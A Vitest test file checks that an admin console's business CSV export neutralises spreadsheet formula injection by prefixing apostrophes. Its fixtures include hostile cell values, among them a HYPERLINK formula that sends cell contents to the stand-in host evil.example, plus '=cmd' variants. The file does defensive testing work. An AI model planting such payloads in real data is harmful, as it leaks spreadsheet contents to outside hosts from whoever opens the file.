import { describe, expect, it } from 'vitest';
import { buildBusinessesCsv, csvCell } from '@/app/(admin)/admin/admin-console/businesses-csv';
import type { BusinessItem } from '@/app/(admin)/admin/admin-console/types';

/** SEC-02: values a self-signed-up business controls must never run as spreadsheet formulas in the admin export. */
describe('SEC-02: admin businesses CSV is safe to open in Excel / Google Sheets', () => {
  it.each([
    ['=1+1', `"'=1+1"`],
    ['=HYPERLINK("https://evil.example/?"&C3,"Open")', `"'=HYPERLINK(""https://evil.example/?""&C3,""Open"")"`],
    ['+919876543210', `"'+919876543210"`],
    ['-2+3', `"'-2+3"`],
    ['@SUM(A1)', `"'@SUM(A1)"`],
    ['\t=cmd', `"'\t=cmd"`],
    ['\r=cmd', `"'\r=cmd"`],
    ['\n=cmd', `"'\n=cmd"`],
  ])('neutralises a formula-like value %j with a leading apostrophe', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it.each([
    ['Sharma Traders', '"Sharma Traders"'],
    ['Acme, "Corp"', '"Acme, ""Corp"""'],
    ['A & B #1 Store', '"A & B #1 Store"'],
    ['9876543210', '"9876543210"'],
    ['shop@example.com', '"shop@example.com"'],
    ['', '""'],
  ])('leaves an ordinary value %j unchanged (only quoted)', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('treats null and undefined as empty', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });

  it('protects every user-controlled column in the real export', () => {
    const hostile: BusinessItem = {
      id: 'biz-x',
      legalName: '=HYPERLINK("https://evil.example","x")',
      tradeName: '+cmd',
      gstin: '29ABCDE1234F1Z5',
      stateCode: '29',
      email: '@evil',
      phone: '-1+1',
      subscriptionPlan: 'essentials',
      subscriptionStatus: 'active',
      subscriptionEndsAt: null,
      activeUtrNo: null,
      invoiceCount: 3,
      userCount: 1,
      createdAt: '2026-11-01T06:30:00Z',
    };
    const [, dataLine] = buildBusinessesCsv([hostile]).split('\n');
    const cells = dataLine?.match(/"(?:[^"]|"")*"|[^,]+/g) ?? [];
    // Legal name, trade name, e-mail and phone each start with an apostrophe inside the quotes.
    for (const index of [0, 1, 3, 4]) {
      expect(cells[index]?.startsWith(`"'`), String(cells[index])).toBe(true);
    }
    // No cell starts (after its opening quote) with a formula trigger.
    for (const cell of cells) {
      expect(/^"[=+\-@]/.test(cell), cell).toBe(false);
    }
  });
});
